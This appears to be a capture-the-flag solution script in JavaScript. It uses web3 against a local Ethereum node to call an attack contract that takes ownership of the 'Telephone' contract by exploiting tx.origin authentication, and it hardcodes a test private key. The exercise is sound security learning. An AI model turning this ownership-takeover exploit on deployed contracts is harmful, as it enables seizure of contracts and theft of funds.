// @format

const Web3 = require('web3');
const Tx = require('ethereumjs-tx');
const BigNumber = require('bignumber.js');

const telephoneAttack = require('./build/contracts/TelephoneAttack.json');
const telephone = require('./build/contracts/Telephone.json');

(async function pwn() {
  // Note that we're not using the deployment keys of the truffle here.
  var privateKey =
    'a3ade3bffea3a3af6c4fdcb7305a3f26a2baff5b97e2f061fadebb9215b6460b';
  var publicKey = '0x03e2edce4bb10110c3b75d14737100c0c34f7199';

  const provider = new Web3.providers.HttpProvider('http://localhost:8545');
  const web3 = new Web3(provider);
  const networkId = await web3.eth.net.getId();
  const teleAttackAddress = telephoneAttack.networks[networkId].address;
  const teleAttackContract = new web3.eth.Contract(
    telephoneAttack.abi,
    teleAttackAddress,
  );
  const telephoneAddress = telephone.networks[networkId].address;
  const telephoneContract = new web3.eth.Contract(
    telephone.abi,
    telephoneAddress,
  );
  // Firstly, we're checking if we're not accidentially the owner of the
  // contract already, as we're also the ones deploying it in this CTF.
  let owner = await telephoneContract.methods.owner().call({from: publicKey});
  console.log(
    'Are we the owner yet?',
    web3.utils.toChecksumAddress(publicKey) ===
      web3.utils.toChecksumAddress(owner),
  );

  // We call our attack contract's pwn method that disguises msg.sender as the
  // one of the contract, while tx.origin stays our public key:
  // https://vessenes.com/tx-origin-and-ethereum-oh-my/
  console.log('Pwning contract with telephoneAttack contract');
  await teleAttackContract.methods.pwn(publicKey).send({from: publicKey});
  // After calling pwn, we're checking again if we're now the owner of the
  // contract.
  owner = await telephoneContract.methods.owner().call({from: publicKey});
  console.log(
    'Are we the owner yet?',
    web3.utils.toChecksumAddress(publicKey) ===
      web3.utils.toChecksumAddress(owner),
  );
})();
